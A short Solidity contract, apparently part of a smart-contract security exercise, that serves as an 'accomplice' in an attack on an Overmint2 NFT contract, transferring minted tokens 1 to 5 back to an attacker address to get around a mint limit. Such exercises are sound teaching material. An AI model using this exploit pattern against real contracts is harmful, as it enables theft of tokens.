// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.24;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Overmint2.sol";

contract Overmint2Accomplice {
    Overmint2 nft;
    address attacker;

    constructor(Overmint2 nft_, address attacker_) {
        nft = nft_;
        attacker = attacker_;
    }

    function finish() external {
        // Send all NFTs back to attacker
        nft.setApprovalForAll(address(this), true);
        for (uint256 i = 1; i <= 5; i++) {
            nft.transferFrom(address(this), attacker, i);
        }
    }
}
